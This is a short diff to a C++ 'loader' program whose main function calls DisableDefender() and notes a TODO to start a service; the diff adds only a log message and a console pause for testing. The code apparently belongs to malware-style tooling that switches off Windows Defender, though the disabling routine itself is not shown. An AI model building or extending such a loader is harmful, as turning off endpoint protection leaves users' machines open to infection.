@@ -1,6 +1,8 @@
 #include "loader.hpp"
 
 int wmain() {
+	Log("[+] Starting loader.", "loader");
+
 	if (DisableDefender() != 0) {
 		// disabling defender failed
 	}
@@ -16,6 +18,10 @@ int wmain() {
 	}
 
 	// TODO: start service
+
+	// keep window open for testing
+	int x;
+	std::cin >> x;
 
 	return 0;
 }
